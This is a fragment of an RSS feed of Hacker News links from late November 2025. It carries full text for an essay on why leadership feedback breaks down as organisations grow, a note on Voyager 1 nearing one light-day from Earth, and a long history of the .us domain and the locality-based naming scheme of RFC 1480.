- x402 demo]]></content:encoded></item><item><title>Gemini CLI tips and tricks for agentic coding</title><link>https://github.com/addyosmani/gemini-cli-tips</link><author>ayoisaiah</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 18:08:02 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>DRAM prices are spiking, but I don&apos;t trust the industry&apos;s why</title><link>https://www.xda-developers.com/dram-prices-spiking-dont-trust-industry-reasons/</link><author>binarycrusader</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 17:12:01 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Feedback doesn&apos;t scale</title><link>https://another.rodeo/feedback/</link><author>ohjeez</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 15:40:14 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Listening is always hard, and it only gets harder at scale.When you're leading a team of five or 10 people, feedback is pretty easy. It's not even really "feedback”: you’re just . You may have hired everyone yourself. You might sit near them (or at least sit near them virtually). Maybe you have lunch with them regularly. You know their kids' names, their coffee preferences, and what they're reading. So when someone has a concern about the direction you're taking things, they just... tell you.You trust them. They trust you. It's just friends talking. You know where they're coming from.At twenty people, things begin to shift a little. You’re probably starting to build up a second layer of leadership and there are multiple teams under you, but you're still fairly close to everyone. The relationships are there, they just may be a bit weaker than before. When someone has a pointed question about your strategy, you probably  know their story, their perspective, and what motivates them. The context is fuzzy, but it’s still there.Somewhere around 100 people, the ground shifts underneath you, as you realize you don’t know everyone anymore. You just can't. There aren't enough hours in the day, and honestly, there aren't enough slots in your brain.Suddenly you have people whose names you don’t recognize offering very sharp commentary about your “leadership.” They’re talking about you but they don’t  you. There’s no shared history, no accumulated trust, no sense of “we’ve been in the trenches together.” Your brain has no context for processing all these voices.Who are these people? Why are they yelling at me? Are they generally reasonable, or do they complain about everything? Do they understand the constraints we're under? Do they have the full picture?Without an existing relationship, it feels like an attack, and your natural human response is to dismiss or deflect the attack. Or worse, to get defensive. Attacks trigger our most primal instincts: fight or flight.This is the point where a lot of leaders start to struggle. They still want to be open to feedback—they really do—but they're also drowning. They start trusting their intuition about what they should pay attention to and what they should ignore. Sometimes that intuition is right. Sometimes it's just... self-selected, stripped of context, pattern matching against existing biases and relationships.On top of that, each extra layer of management, each extra level to the top has separated you, and now you’re just not like them anymore. Their struggles are not your struggles anymore.By the time you reach 200 people or more, feedback isn't an actionable signal anymore. At that size, feedback stops being signal being noise. A big, echoing amphitheater of opinions, each louder than the last, each written in the tone of someone who is absolutely  they understand the whole system (they don’t), the whole context (they don’t), and your motives (they definitely don’t).And all those kudos you used to hear? Those dry up. When you had a close relationship with everyone, kudos came naturally. You were just talking. But now folks just expect you to lead, and if they’re happy with your leadership they’re probably mostly quiet about it. They're doing their jobs, trusting you, assuming things are generally fine.The people who are unhappy? They're loud. And there are a lot of them.From where you sit, it feels like everybody's mad about everything all the time. And maybe they are! Or maybe it's just selection bias combined with the natural amplification that happens when people with similar grievances find each other.  You don't know if this is a real crisis or just three loud people who found each other in a Slack channel. You just can’t tell anymore.Because feedback doesn’t scale. Humans scale poorly. Your nervous system definitely doesn’t scale.Feedback doesn't scale because relationships don’t scale. With five people, you have some personal interaction with everyone on the team. At twenty, you interact with some, but not all. At 100 you still have personal relationships with 10 or 15 people, so there are a lot of gaps. At 200, your personal relationships are a tiny slice of the overall pie.Making matters worse, as the din gets louder and louder, channels for processing all that feedback get smaller and smaller. Where you once had an open-door policy, now you have “office hours.” Sometimes. When we’re not too busy.Where once All-Hands meetings had open questions, now you’re forced to take the questions ahead of time. Or not at all.Even your Slack usage dwindles, because half the time you say anything, someone’s upset with it.We tell ourselves we're "staying close to the ground" and "maintaining our culture,” But we're not. We can't. Because the fundamental math doesn't work. The sheer volume of feedback we’re getting absolutely overwhelms our ability to process it.So what do you do about it?#First, you have to admit the problem exists. Stop pretending you can maintain personal relationships with 200 people. You can't. Nobody can. Once you accept this, you can start building systems and processes that work with this reality instead of bumping against it. You have to filter, sort, and collate the feedback coming in, and you need to do it at a scale larger than your own capacity.When you can’t rely on “just talk to people,” you need systems that distinguish between:and “this person is projecting a whole other problem onto leadership”That means: structured listening, actual intake processes, and ways to synthesize themes instead of reacting to every single spike.Build proxy relationships. You can't know 200 people, but you can know 10 people who each know 10 people. You should already have strong, trusting relationships with your leadership team, and then set the expectation that they have strong relationships with their own teams, and explicitly ask what’s on people’s minds. When feedback comes up through this chain, it comes with context. Pay attention.At small scale, trust is direct:  At larger scale, trust must be delegated: I trust the leaders who are closer to the work than I am. If you don’t intentionally empower those leaders to absorb and contextualize feedback, you’ll drown. They’re the ones who can say: "I know who said that, why they said it, and here’s what’s actually going on."Build structured channels for feedback. For example, you can set up working groups to dive into thorny problems. The people closest to the problem understand it better than you do, and they can turn a flood of complaints into something you can actually act on. Or consider starting an "employee steering committee" for the sole purpose of collecting feedback and turning it into proposals. You’re essentially deputizing people who care deeply to listen for you, and then manage the feedback din.Remember that every angry message is still a person. When someone you know well gives you feedback, you might not like it, but you’re likely to say "Oof. Okay. Let’s talk." At scale, you need to find ways to respond with humanity — even when the feedback you received lacks it. Let people know when you’re acting on their feedback, and if you’re not going to act on it, let them know that you at least heard it. Nobody wants to feel unheard.In fact, you'll probably think — if you haven't done it already — that you should have an anonymous comment system to capture feedback. Don't. It's a trap. Anonymous feedback is the most contextless feedback you'll get, which makes it the least actionable. And it inevitably turns out to be contradictory or lacking key information, all those folks feel even more unheard and unhappy than before.Finally, accept that you're going to get it wrong sometimes, and own that. You're going to ignore feedback that turns out to be important. You're going to overreact to feedback that turns out to be noise. When you make a misstep, be transparent about how you're correcting it.Past a certain size, you have to make peace with the fact that a lot of people in your org are going to be frustrated with you, and you're going to have no idea why, and you may not going to be able to fix it.Not because you're a bad leader. Not because you don't care. But because feedback doesn't scale, relationships don't scale, and the alternative—trying to maintain authentic personal connections with hundreds of people—is a recipe for burnout and failure.This is genuinely hard to accept, especially if you came up through the early days when you did know everyone. That version of leadership was real, and it worked, and it probably felt really good. But it doesn't work anymore, and pretending it does just makes things worse.Note: The photo is of a large crowd gathering for a union meeting during the 1933 New York Dressmakers Strike. That's scaling feedback.
        Published 
         in Writing
      ]]></content:encoded></item><item><title>OpenAI needs to raise at least $207B by 2030</title><link>https://ft.com/content/23e54a28-6f63-4533-ab96-3756d9c88bad</link><author>akira_067</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 15:06:37 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Voyager 1 is about to reach one light-day from Earth</title><link>https://scienceclock.com/voyager-1-is-about-to-reach-one-light-day-from-earth/</link><author>ashishgupta2209</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 14:02:46 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[After nearly 50 years in space, NASA’s Voyager 1 is about to hit a historic milestone. By November 15, 2026, it will be 16.1 billion miles (25.9 billion km) away, meaning a radio signal will take a full 24 hours—a full light-day—to reach it. For context, a light-year is the distance light travels in a year, about 5.88 trillion miles (9.46 trillion km), so one light-day is just a tiny fraction of that.Communicating with Voyager 1 is slow. Commands now take about a day to arrive, with another day for confirmation. Compare that to the Moon (1.3 seconds), Mars (up to 4 minutes), and Pluto (nearly 7 hours). The probe’s distance makes every instruction a patient exercise in deep-space operations. To reach our closest star, Proxima Centauri, even at light speed, would take over four years—showing just how tiny a light-day is in cosmic terms.Voyager 1’s journey is more than a record for distance. From its planetary flybys to the iconic Pale Blue Dot’ image, it reminds us of the vast scale of the solar system and the incredible endurance of a spacecraft designed to keep exploring, even without return.]]></content:encoded></item><item><title>Memories of .us</title><link>https://computer.rip/2025-11-11-dot-us.html</link><author>sabas_ge</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 13:36:19 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[How much do you remember from elementary school? I remember vinyl tile floors,
the playground, the teacher sentencing me to standing in the hallway. I had a
teacher who was a chess fanatic; he painted a huge chess board in the paved
schoolyard and got someone to fabricate big wooden chess pieces. It was enough
of an event to get us on the evening news. I remember Run for the Arts, where I
tried to talk people into donating money on the theory that I could run, which
I could not. I'm about six months into trying to change that and I'm good for a
mediocre 5k now, but I don't think that's going to shift the balance on K-12
art funding.I also remember a domain name: bridger.pps.k12.or.usI have quipped before that
computer science is a field mostly concerned with assigning numbers to things,
which is true, but it only takes us so far. Computer scientists also like to
organize those numbers into structures, and one of their favorites has always
been the tree. The development of wide-area computer networking surfaced a
whole set of problems around naming or addressing computer systems that belong
to organizations. A wide-area network consists of a set of institutions that
manage their own affairs. Each of those institutions may be made up of
departments that manage their own affairs. A tree seemed a natural fit. Even
the "low level" IP addresses, in the days of "classful" addressing, were
a straightforward hierarchy: each dot separated a different level of the tree,
a different step in an organizational hierarchy.The first large computer networks, including those that would
become the Internet, initially relied on manually building lists of machines by
name. By the time the Domain Name System was developed, this had already become
cumbersome. The rapid growth of the internet was hard to keep up with, and besides,
why did any one central entity---Jon Postel or whoever---even care about the
names of all of the computers at Georgia Tech? Like IP addressing, DNS was designed
as a hierarchy with delegated control. A registrant obtains a name in the hierarchy,
say gatech.edu, and everything "under" that name is within the control, and
responsibility, of the registrant. This arrangement is convenient for both the
DNS administrator, which was a single organization even after the days of Postel,
and for registrants.We still use the same approach today... mostly. The meanings of levels of the
hierarchy have ossified. Technically speaking, the top of the DNS tree, the DNS
root, is a null label referenced by a trailing dot. It's analogous to the '/'
at the beginning of POSIX file paths. "gatech.edu" really should be written as
"gatech.edu." to make it absolute rather than relative, but since resolution of
relative URLs almost always recurses to the top of the tree, the trailing dot
is "optional" enough that it is now almost always omitted. The analogy to POSIX
file paths raises an interesting point: domain names are backwards. The 'root'
is at the end, rather than at the beginning, or in other words, they run from
least significant to most significant, rather than most significant to least
significant. That's just... one of those things, you know? In the early days
one wasn't obviously better than the other, people wrote hierarchies out both
ways, and as the dust settled the left-to-right convention mostly prevailed
but right-to-left hung around in some protocols. If you've ever dealt with
endianness, this is just one of those things about computers that you have to
accept: we cannot agree on which way around to write things.Anyway, the analogy to file paths also illustrates the way that DNS has ossified.
The highest "real" or non-root component of a domain name is called the top-level
domain or TLD, while the component below it is called a second-level domain. In
the US, it was long the case that top-level domains were fixed while second-level
domains were available for registration. There have always been exceptions in
other countries and our modern proliferation of TLDs has changed this somewhat,
but it's still pretty much true. When you look at "gatech.edu" you know that
"edu" is just a fixed name in the hierarchy, used to organize domain names by
organization type, while "gatech" is a name that belongs to a registrant.Under the second-level name, things get a little vague. We are all familiar with
the third-level name "www," which emerged as a convention for web servers and
became a practical requirement. Web servers having the name "www" under an
organization's domain was such a norm for so many years that hosting a webpage
directly at a second-level name came to be called a "naked domain" and had some
caveats and complications.Other than www, though, there are few to no standards for the use of third-level
and below names. Larger organizations are more likely to use third-level names
for departments, infrastructure operators often have complex hierarchies of
names for their equipment, and enterprises the world 'round name their load-balanced
webservers "www2," "www3" and up. If you think about it, this situation seems like
kind of a failure of the original concept of DNS... we do use the hierarchy, but
for the most part it is not intended for human consumption. Users are only
expected to remember two names, one of which is a TLD that comes from a relatively
constrained set.The issue is more interesting when we consider geography. For a very long time, TLDs
have been split into two categories: global TLDs, or gTLDs, and country-code TLDs,
or ccTLDs. ccTLDs reflect the ISO country codes of each country, and are intended for
use by those countries, while gTLDs are arbitrary and reflect the fact that DNS was
designed in the US. The ".gov" gTLD, for example, is for use by the US government,
while the UK is stuck with ".gov.uk". This does seem unfair but it's now very much
cemented into the system: for the large part, US entities use gTLDs, while entities
in other countries use names under their respective ccTLDs. The ".us" ccTLD exists
just as much as all the others, but is obscure enough that my choice to put my
personal website under .us (not an ideological decision but simply a result of where
a nice form of my name was available) sometimes gets my email address rejected.Also, a common typo for ".us" is ".su" and that's geopolitically amusing. .su is of
course the ccTLD for the Soviet Union, which no longer exists, but the ccTLD lives
on in a limited way because it became Structurally Important and difficult to remove, as names and addresses
tend to do.We can easily imagine a world where this historical injustice had been fixed: as
the internet became more global, all of our US institutions could have moved under
the .us ccTLD. In fact, why not go further? Geographers have long organized political
boundaries into a hierarchy. The US is made up of states, each of which has been
assigned a two-letter code by the federal government. We have ".us", why not "nm.us"?The answer, of course, is that we do.In the modern DNS, all TLDs have been delegated to an organization who administers
them. The .us TLD is rightfully administered by the National Telecommunications and
Information Administration, on the same basis by which all ccTLDs are delegated to
their respective national governments. Being the US government, NTIA has naturally
privatized the function through a contract to telecom-industrial-complex giant
Neustar. Being a US company, Neustar restructured and sold its DNS-related business
to GoDaddy. Being a US company, GoDaddy rose to prominence on the back of infamously
tasteless television commercials, and its subsidiary Registry Services LLC now
operates our nation's corner of the DNS.But that's the present---around here, we avoid discussing the present so as to hold
crushing depression at bay. Let's turn our minds to June 1993, and the publication of
RFC 1480 "The US Domain." To wit:Even though the original intention was that any educational
institution anywhere in the world could be registered under the EDU
domain, in practice, it has turned out with few exceptions, only
those in the United States have registered under EDU, similarly with
COM (for commercial). In other countries, everything is registered
under the 2-letter country code, often with some subdivision.  For
example, in Korea (KR) the second level names are AC for academic
community, CO for commercial, GO for government, and RE for research.
However, each country may go its own way about organizing its domain,
and many have.Oh, so let's sort it out!There are no current plans of putting all of the organizational
domains EDU, GOV, COM, etc., under US.  These name tokens are not
used in the US Domain to avoid confusion.Currently, only four year colleges and universities are being
registered in the EDU domain.  All other schools are being registered
in the US Domain.RFC 1480 is a very interesting read. It makes passing references to so many
facets of DNS history that could easily be their own articles. It also
defines a strict, geography-based hierarchy for the .us domain that is a
completely different universe from the one in which we now live. For example,
we learned above that, in 1993, only four-year institutions were being
placed under .edu. What about the community colleges? Well, RFC 1480 has an
answer. Central New Mexico Community College would, of course, fall under
cnm.cc.nm.us. Well, actually, in 1993 it was called the Technical-Vocational
Institute, so it would have been tvi.tec.nm.us. That's right, the RFC
describes both "cc" for community colleges and "tec" for technical institutes.Even more surprising, it describes placing entities under a "locality" such as
a city. The examples of localities given are "berkeley.ca.us" and "portland.wa.us", the
latter of which betrays an ironic geographical confusion. It then specifies "ci"
for city and "co" for county, meaning that the city government of our notional
Portland, Washington would be ci.portland.wa.us. Agencies could go under the
city government component (the RFC gives the example "Fire-Dept.CI.Los-Angeles.CA.US")
while private businesses could be placed directly under the city (e.g. "IBM.Amonk.NY.US").
The examples here reinforce that the idea itself is different from how we use DNS
today: The DNS of RFC 1480 is far more hierarchical and far more focused on full
names, without abbreviations.Of course, the concept is not limited to local government. RFC 1480 describes
"fed.us" as a suffix for the federal government (the example "dod.fed.us" illustrates
that this has not at all happened), and even "General Independent Entities" and
"Distributed National Institutes" for those trickier cases.We can draw a few lessons from how this proposal compares to our modern day.
Back in the 1990s, .gov was limited to the federal government.
The thinking was that all government agencies would move into .us, where the
hierarchical structure made it easier to delegate management of state and
locality subtrees. What actually happened was the opposite: the .us thing
never really caught on, and a more straightforward and automated management
process made .gov available to state and local governments. The tree has
effectively been flattened.That's not to say that none of these hierarchical names saw use.
GoDaddy continues to maintain what they call the "usTLD Locality-Based
Structure". At the decision of the relevant level of the hierarchy (e.g.
a state), locality-based subdomains of .us can either be delegated to
the state or municipality to operate, or operated by GoDaddy itself as
the "Delegated Manager." The latter arrangement is far more common, and
it's going to stay that way: RFC 1480 names are not dead, but they are
on life support. GoDaddy's contract allows them to stop onboarding any
additional delegated managers, and they have.Few of these locality-based names found wide use, and there are even
fewer left today. Multnomah County Library once used "multnomah.lib.or.us,"
which I believe was actually the very first "library" domain name registered.
It now silently redirects to "multcolib.org", which
we could consider a graceful name only in that the spelling of
"Multnomah" is probably not intuitive to those not from the region. As
far as I can tell, the University of Oregon and OGI (part of OHSU)
were keeping very close tabs on the goings-on of academic DNS, as
Oregon entities are conspicuously over-represented in the very early
days of RFC 1480 names---behind only California, although Georgia
Tech and Trent Heim of former Colorado company XOR both registered enough names to give their
states a run for the money."co.bergen.nj.us" works, but just gets you a redirect notice page to
bergencountynj.gov. It's interesting that this name is actually longer
than the RFC 1480 name, but I think most people would agree that bergencountynj.gov
is easier to remember. Some of that just comes down to habit, we all know ".gov",
but some of it is more fundamental. I don't think that people often
understand the hierarchical structure of DNS, at least not intuitively, and
that makes "deeply hierarchical" (as GoDaddy calls them) names confusing.Certainly the RFC 1480 names for school districts produced complaints.
They were also by far the most widely adopted. You can pick and choose
examples of libraries (.lib.[state].us) and municipal governments that have
used RFC 1480 names, but school districts are another world: most school
districts that existed at the time have a legacy of using RFC 1480 naming.
As one of its many interesting asides, RFC 1480 explains why: the practice
of putting school districts under [district].k12.[state].us actually
predates RFC 1480. Indeed, the RFC seems to have been written in part to
formalize the existing practice. The idea of the k12.[state].us hierarchy
originated within IANA in consultation with InterNIC (newly created at
the time) and the Federal Networking Council, a now-defunct advisory
committee of federal agencies that made a number of important early
decisions about internet architecture.RFC 1480 is actually a revision on the slightly older RFC 1386, which
instead of saying that schools were already using the k12 domains, says that
"there ought to be a consistent scheme for naming them." It then says
that the k12 branch has been "introduced" for that purpose. RFC 1386 is
mostly silent on topics  than schools, so I think it was written
to document the decision made about schools with other details about
the use of locality-based domains left sketchy until the more thorough
RFC 1480.The decision to place "k12" under the state rather than under a municipality
or county might seem odd, but the RFC gives a reason. It's not unusual for
school districts, even those named after a municipality, to cover a larger
area than the municipality itself. Albuquerque Public Schools operates
schools in the East Mountains; Portland Public Schools operates schools
across multiple counties and beyond city limits. Actually the RFC gives
exactly that second one as an example:For example, the Portland school
district in Oregon, is in three or four counties.  Each of those
counties also has non-Portland districts.I include that quote mostly because I think it's funny that the authors
now know what state Portland is in. When you hear "DNS" you think Jon
Postel, at least if you're me, but RFC 1480 was written by Postel along
with a less familiar name, Ann Westine Cooper. Cooper was a coworker of
Postel at USC, and RFC 1480 very matter-of-factly names the duo of
Postel and Cooper as the administrator of the .US TLD. That's interesting
considering that almost five years later Postel would become involved in
a notable conflict with the federal government over control of DNS---one
of the events that precipitated today's eccentric model of public-private
DNS governance.There are other corners of the RFC 1480 scheme that were not contemplated
in 1993, and have managed to outlive many of the names that were. Consider,
for example, our indigenous nations: these are an exception to the normal
political hierarchy of the US. The Navajo Nation, for example, exists in a
state that is often described as parallel to a state, but isn't really.
Native nations are sovereign, but are also subject to federal law by
statute, and subject to state law by various combinations of statute,
jurisprudence, and bilateral agreement. I didn't really give any detail
there and I probably still got something wrong, such is the complicated
legal history and present of Native America. So where would a native
sovereign government put their website? They don't fall under the
traditional realm of .gov, federal government, nor do they fall under a
state-based hierarchy. Well, naturally, the Navajo Nation is found at
navajo-nsn.gov.We can follow the "navajo" part but the "nsn" is odd, unless they spelled
"nation" wrong and then abbreviated it, which I've always thought is what
it looks like on first glance. No, this domain name is very much an artifact
of history. When the problem of sovereign nations came to Postel and Cooper,
the solution they adopted was a new affinity group, like "fed" and "k12"
and "lib": "nsn", standing for Native Sovereign Nation. Despite being a
late comer, nsn.us probably has the most enduring use of any part of the
RFC 1480 concept. Dozens of pueblos, tribes, bands, and confederations
still use it. squamishtribe.nsn.us, muckleshoot.nsn.us, ctsi.nsn.us,
sandiapueblo.nsn.us.Yet others have moved away... in a curiously "partial" fashion. navajo-nsn.gov
as we have seen, but an even more interesting puzzler is tataviam-nsn.us. It's
only one character away from a "standardized" NSN affinity group locality domain,
but it's so far away. As best I can tell, most of these governments initially
adopted "nsn.us" names, which cemented the use of "nsn" in a similar way to "state"
or "city" as they appear in many .gov domains to this day. Policies on .gov
registration may be a factor as well, the policies around acceptable .gov names
seem to have gone through a long period of informality and then changed a number
of times. Without having researched it too deeply, I have seen bits and pieces
that make me think that at various points NTIA has preferred that .gov domains
for non-federal agencies have some kind of qualifier to indicate their "level"
in the political hierarchy. In any case, it's a very interesting situation because
"native sovereign nation" is not otherwise a common term in US government.
It's not like lawyers or lawmakers broadly refer to tribal governments as NSNs,
the term is pretty much unique to the domain names.So what ever happened to locality-based names? RFC 1480 names have fallen
out of favor to such an extent as to be considered legacy by many of their
users. Most Americans are probably not aware of this name hierarchy at all,
despite it ostensibly being the unified approach for this country. In
short, it failed to take off, and those sectors that had widely adopted it
(such as schools) have since moved away. But why?I put a lot of time into writing this, and I hope that you enjoy reading
it. If you can spare a few dollars, consider supporting me on
ko-fi. You'll receive an occasional extra,
subscribers-only post, and defray the costs of providing artisanal, hand-built
world wide web directly from Albuquerque, New Mexico.As usual, there seem to be a few reasons. The first is user-friendliness.
This is, of course, a matter of opinion---but anecdotally, many people
seem to find deeply hierarchical domain names confusing. This may be a
self-fulfilling prophecy, since the perception that multi-part DNS names
are user-hostile means that no one uses them which means that no users
are familiar with them. Maybe, in a different world, we could have broken
out of that loop. I'm not convinced, though. In RFC 1480, Postel and
Cooper argue that a deeper hierarchy is valuable because it allows for
more entities to have their "obviously correct" names. That does make
sense to me, splitting the tree up into more branches means that there is
less name contention within each branch. But, well, I think it might be
the kind of logic that is intuitive only those who work in computing.
For the general public, I think long multi-part names quickly become
difficult to remember and difficult to type. When you consider the dollar
amounts that private companies have put into dictionary word domain names,
it's no surprise that government agencies tend to prefer one-level names
with full words and simple abbreviations.I also think that the technology outpaced the need that RFC 1480 was
intended to address. The RFC makes it very clear that Postel and Cooper
were concerned about the growing size of the internet, and expected the
sheer number of organizations going online to make maintenance of the DNS
impractical. They correctly predicted the explosion of hosts, but not the
corresponding expansion of the DNS bureaucracy. Between the two versions
of the .us RFC, DNS operations were contracted to Network Solutions. This
began a winding path that lead to delegation of DNS zones to various
private organizations, most of which fully automated registration and
delegation and then federated it via a common provisioning protocol. The
size of, say, the .com zone really did expand beyond what DNS's designers
had originally anticipated... but it pretty much worked out okay. The
mechanics of DNS's maturation probably had a specifically negative effect
on adoption of .us, since it was often under a different operator from the
"major" domain names and not all "registrars" initially had access.Besides, the federal government never seems to have been all that on board
with the concept. RFC 1480 could be viewed as a casualty of the DNS wars,
a largely unexplored path on the branch of DNS futures that involved IANA
becoming completely independent of the federal government. That didn't
happen. Instead, in 2003 .gov registration was formally opened to municipal,
state, and tribal governments. It became federal policy to encourage use of
.gov for trust reasons (DNSSEC has only furthered this), and .us began to fall by the wayside.That's not to say that RFC 1480 names have ever gone away. You can still
find many of them in use. state.nm.us doesn't have an A record, but governor.state.nm.us
and a bunch of other examples under it do. The internet is littered
with these locality-based names, many of them hiding out in smaller
agencies and legacy systems. Names are hard to get right, and one of the reasons is
that they're very hard to get rid of.When things are bigger, names have to be longer.  There is an
argument that with only 8-character names, and in each position allow
a-z, 0-9, and -, you get 37**8 = 3,512,479,453,921 or 3.5 trillion
possible names.  It is a great argument, but how many of us want
names like "xs4gp-7q".  It is like license plate numbers, sure some
people get the name they want on a vanity plate, but a lot more
people who want something specific on a vanity plate can't get it
because someone else got it first.  Structure and longer names also
let more people get their "obviously right" name.You look at Reddit these days and see all these usernames that are two
random words and four random numbers, and you see that Postel and Cooper
were right. Flat namespaces create a problem, names must either be complex
or long, and people don't like it either. What I think they got wrong, at
a usability level, is that deep hierarchies still create names that are
complex  long. It's a kind of complexity that computer scientists
are more comfortable with, but that's little reassurance when you're
staring down the barrel of "bridger.pps.k12.or.us".]]></content:encoded></item></channel></rss>